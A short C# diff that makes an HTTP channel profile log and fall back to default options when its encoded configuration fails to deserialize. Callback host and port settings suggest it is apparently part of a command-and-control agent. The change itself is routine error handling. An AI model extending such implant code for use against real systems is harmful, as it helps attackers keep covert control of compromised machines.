@@ -33,10 +33,18 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            var opts = JsonSerializer.Deserialize(
-                ChannelConfig.Decode(),
-                HttpChannelOptionsJsonContext.Default.HttpChannelOptions)
-                ?? throw new InvalidOperationException("Invalid HTTP profile configuration");
+            HttpChannelOptions? opts = null;
+            try
+            {
+                opts = JsonSerializer.Deserialize(
+                    ChannelConfig.Decode(),
+                    HttpChannelOptionsJsonContext.Default.HttpChannelOptions);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Failed to deserialize HTTP channel options: {ex.Message}");
+            }
+            opts ??= new HttpChannelOptions();
 
             string baseUrl = $"{opts.CallbackHost.TrimEnd('/')}:{opts.CallbackPort}";
             this.userAgent = opts.Headers.GetValueOrDefault("User-Agent", "");
